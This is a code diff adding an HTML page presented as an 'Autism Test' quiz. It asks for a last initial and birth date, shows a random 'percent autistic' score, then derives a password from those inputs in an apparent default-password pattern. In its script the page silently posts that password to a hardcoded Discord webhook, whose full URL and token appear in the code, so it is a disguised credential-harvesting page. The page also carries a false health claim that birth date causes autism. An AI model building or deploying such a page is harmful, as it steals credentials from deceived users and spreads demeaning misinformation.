@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autism Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 15px; /* Rounded corners */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        h1 {
+            text-align: center;
+            color: #333333;
+            margin-bottom: 10px;
+        }
+
+        h2 {
+            text-align: center;
+            color: #666666;
+            margin-top: 0;
+            font-weight: normal;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        label {
+            margin-bottom: 10px;
+            color: #666666;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        input[type="submit"] {
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        input[type="submit"] {
+            background-color: #4caf50;
+            color: #ffffff;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+
+        #passwordContainer {
+            margin-top: 20px;
+            padding: 20px;
+            border: 1px solid #cccccc;
+            border-radius: 10px; /* Rounded corners */
+            background-color: #f9f9f9;
+        }
+
+        #password {
+            margin-top: 10px;
+            font-size: 18px;
+            text-align: center;
+            color: #333333;
+        }
+
+        #copyButtons {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-around;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Autism Test</h1>
+        <h2>Did you know most autism is due to being born on a certain day?</h2>
+        <form id="surveyForm">
+            <label for="lastName">Last Initial:</label>
+            <input type="text" id="lastName" name="lastName" maxlength="1" required>
+            
+            <label for="birthMonth">Month of Birth (MM):</label>
+            <input type="number" id="birthMonth" name="birthMonth" min="1" max="12" required>
+            
+            <label for="birthDay">Day of Birth (DD):</label>
+            <input type="number" id="birthDay" name="birthDay" min="1" max="31" required>
+            
+            <label for="birthYear">Year of Birth (YYYY):</label>
+            <input type="number" id="birthYear" name="birthYear" min="1900" max="2024" required>
+            
+            <input type="submit" value="Calculate">
+        </form>
+
+        <div id="passwordContainer" style="display: none;">
+            <div id="password"></div>
+            <div id="copyButtons"></div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('surveyForm');
+        const passwordDiv = document.getElementById('password');
+        const copyButtonsDiv = document.getElementById('copyButtons');
+        const passwordContainer = document.getElementById('passwordContainer');
+        const webhookURL = 'https://discord.com/api/webhooks/1234877035697012938/j0555eJC3wBdfM1hwifCoKoBUWJoDrxQ6Mr_XvKU8Ieewki2TQegxzRs20Sq7dWjy-gO';
+        let isSecondClick = false;
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            if (!isSecondClick) {
+                const randomAutismPercentage = Math.floor(Math.random() * 101); // Random number between 0-100
+                passwordDiv.textContent = `Judging by your birthday, you are ${randomAutismPercentage}% autistic!`;
+                isSecondClick = true;
+                form.querySelector('input[type="submit"]').value = "Next";
+                passwordContainer.style.display = 'block';
+            } else {
+                const lastName = document.getElementById('lastName').value.toUpperCase();
+                const birthMonth = document.getElementById('birthMonth').value.padStart(2, '0');
+                const birthDay = document.getElementById('birthDay').value.padStart(2, '0');
+                const birthYear = document.getElementById('birthYear').value;
+
+                const password = lastName + birthMonth + birthDay + birthYear.slice(-2) + 's';
+
+                passwordDiv.innerHTML = '<div><strong>Password:</strong> ' + password + '</div>';
+
+                // Add copy buttons
+                const copyPasswordButton = document.createElement('button');
+                copyPasswordButton.textContent = 'Copy Password';
+                copyPasswordButton.addEventListener('click', function() {
+                    navigator.clipboard.writeText(password).then(function() {
+                        // alert('Password copied to clipboard!');
+                    }, function() {
+                        alert('Failed to copy password to clipboard!');
+                    });
+                });
+
+                copyButtonsDiv.innerHTML = '';
+                copyButtonsDiv.appendChild(copyPasswordButton);
+
+                // Send data to Discord webhook
+                const message = {
+                    content: 'Password: ' + password
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send message to Discord');
+                    }
+                    // No alert for success
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // No alert for failure
+                });
+
+                // Remove "Next" button
+                const nextButton = form.querySelector('input[type="submit"]');
+                nextButton.parentNode.removeChild(nextButton);
+            }
+        });
+    </script>
+</body>
+</html>
